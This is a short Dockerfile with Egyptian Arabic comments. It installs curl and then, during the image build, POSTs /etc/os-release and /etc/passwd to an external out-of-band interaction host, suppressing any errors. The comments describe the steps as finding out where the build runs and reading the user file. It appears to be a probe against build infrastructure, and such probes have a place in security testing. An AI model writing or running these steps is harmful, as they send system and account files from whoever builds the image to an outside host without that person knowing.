FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# 2. ابعت ملف إصدار النظام (عشان نعرف إحنا فين)
# دي مفيهاش أي Shell Expansion، الـ curl هو اللي بيقرأ
RUN curl -X POST -d @/etc/os-release http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/OS_INFO || true

# 3. ابعت ملف اليوزرز (عشان تشوف كلمة root بعينك)
# ده هيجيبلك أول سطور من ملف الباسورد
RUN curl -X POST -d @/etc/passwd http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/PASSWD_FILE || true
